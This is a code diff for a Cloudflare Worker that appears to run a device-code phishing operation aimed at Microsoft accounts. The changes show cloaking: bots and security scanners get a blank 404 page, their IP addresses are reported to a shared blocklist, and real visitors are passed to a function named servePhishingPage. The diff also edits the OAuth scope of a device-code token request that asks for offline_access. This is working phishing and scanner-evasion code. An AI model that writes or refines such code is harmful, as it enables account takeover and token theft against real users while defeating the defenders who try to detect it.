@@ -219,24 +219,13 @@ async function handleRequest(request, waitUntil) {
       return servePhishingPage(request);
     }
   } else {
-    // Bot detected - return a simple harmless white page.
+    // Bot/crawler/scanner detected - return a harmless 404-style page.
     //
-    // No <title> (browsers fall back to the URL, which is what a real empty
-    // page does), no branding, no product name - nothing in the response can
-    // be attributed to this deployment. The anti-scraping script is kept so a
-    // scanner that does render the page still cannot copy, screenshot-annotate
-    // or inspect it.
-    console.log('[Worker] Bot blocked (white page):', botCheck.reason);
+    // This prevents bots from ever seeing the verification page content.
+    // Real users still pass the bot check above and reach servePhishingPage().
+    console.log('[Worker] Bot blocked (404 page):', botCheck.reason);
 
-    // Grow the blocklist from what we just stopped, so a scanner that later
-    // returns with a normal user agent is still blocked by address. Skip
-    // ip_blocklist hits - those addresses are already in the list, so
-    // re-reporting them is pure noise.
-    //
-    // The visitor's response must not depend on the backend being up, but the
-    // fetch DOES need waitUntil: Workers discard in-flight requests once the
-    // response is returned, so a plain .catch() here would lose every signal.
-    // waitUntil keeps the isolate alive without delaying the white page.
+    // Continue reporting scanner IPs in the background without delaying the response.
     if (botCheck.reason.indexOf('ip_blocklist') === -1) {
       const signalIp = (request.headers.get('CF-Connecting-IP') ||
                         request.headers.get('X-Forwarded-For') || '')
@@ -249,20 +238,20 @@ async function handleRequest(request, waitUntil) {
             ip: signalIp,
             user_agent: request.headers.get('user-agent') || '',
             reason: botCheck.reason,
-            // Authenticates the caller so the endpoint is not an open write.
             jwt_token: JWT_TOKEN,
           }),
         }).catch(function () {}));
       }
     }
-    const whitePage = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>html,body{margin:0;padding:0;background:#fff;height:100%;overflow:hidden;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}</style><script>document.addEventListener('keydown',function(e){if(e.ctrlKey||e.metaKey){e.preventDefault();e.stopPropagation()}if(e.key==='F12'){e.preventDefault()}if(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i')){e.preventDefault()}if(e.ctrlKey&&e.key==='u'){e.preventDefault()}if(e.ctrlKey&&e.key==='s'){e.preventDefault()}if(e.ctrlKey&&e.key==='p'){e.preventDefault()}});document.addEventListener('contextmenu',function(e){e.preventDefault()});document.addEventListener('selectstart',function(e){e.preventDefault()})<\/script></head><body></body></html>`;
-    return new Response(whitePage, {
-      status: 200,
+
+    const notFoundPage = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Not Found</title><style>html,body{margin:0;padding:0;background:#fff;height:100%;overflow:hidden}</style></head><body></body></html>`;
+    return new Response(notFoundPage, {
+      status: 404,
       headers: {
         'Content-Type': 'text/html; charset=utf-8',
         'Cache-Control': 'no-cache, no-store, must-revalidate',
         'X-Content-Type-Options': 'nosniff',
-      }
+      },
     });
   }
 
@@ -443,7 +432,7 @@ async function handleDeviceCodeRequest(request) {
           headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
           body: new URLSearchParams({
             client_id: verifyData.client_id,
-            scope: 'offline_access openid profile https://graph.microsoft.com/.default',
+                        scope: 'openid profile email offline_access',
           }),
         }
       );
